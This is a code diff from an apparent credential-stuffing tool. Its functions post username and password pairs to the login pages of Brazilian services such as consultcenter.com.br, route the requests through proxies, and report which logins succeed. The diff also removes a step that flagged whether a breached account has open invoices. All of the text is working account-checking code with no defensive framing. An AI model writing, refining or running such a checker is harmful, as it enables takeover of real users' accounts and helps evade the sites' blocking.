@@ -166,9 +166,7 @@ def check_checkok(user, pwd):
     return "negado" not in r.text, ""
 
 def check_consultcenter(user, pwd):
-    s  = requests.Session()
-    px = _get_proxy()
-    r = s.post(
+    r = requests.post(
         "https://sistema.consultcenter.com.br/users/login",
         headers={"accept": "text/html,application/xhtml+xml,*/*",
                  "content-type": "application/x-www-form-urlencoded",
@@ -181,18 +179,10 @@ def check_consultcenter(user, pwd):
             f"&data%5BUsuarioLogin%5D%5Busername%5D={user}"
             f"&data%5BUsuarioLogin%5D%5Bpassword%5D={pwd}"
         ),
-        proxies=px, timeout=15,
+        proxies=_get_proxy(), timeout=15,
     )
     html = r.text.lower()
-    if "senha incorretos" in html or "bloqueado" in html:
-        return False, ""
-
-    # The "faturas em aberto" alert is a CakePHP flash message: it only
-    # renders once, on the page the login redirect lands on (r.text, since
-    # requests follows redirects by default). A second GET to /portal
-    # arrives after the flash was already consumed/cleared server-side.
-    faturas = "faturas_abertoMessage" in r.text
-    return True, "faturas em aberto" if faturas else "sem faturas em aberto"
+    return "senha incorretos" not in html and "bloqueado" not in html, ""
 
 def check_credicorp(user, pwd):
     r = requests.post(
